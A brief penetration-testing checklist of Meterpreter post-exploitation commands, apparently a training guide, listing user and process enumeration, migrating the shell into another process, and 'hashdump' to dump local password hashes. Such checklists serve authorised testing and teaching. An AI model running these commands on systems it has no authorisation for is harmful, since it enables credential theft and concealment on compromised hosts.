# Penetration Testing Checklist

A complete Meterpreter Enumeration checklist once an initial Meterpreter shell has been spawned against the target host.

This guide is written in a methodical step-by-step process, it is recommended not skipping steps.   
&nbsp;

**Simple Commands**

*Get current user/group information*
```Windows
getuid
```

*Get current running process attached to the shell*
```Windows
getpid
```

*Get all running processes*
```Windows
ps aux
```

*Migrate to a new PID*
```Windows
migrate {process_id}
```

*Dump local user hashes (if permissions)*
```Windows
hashdump
```
&nbsp;
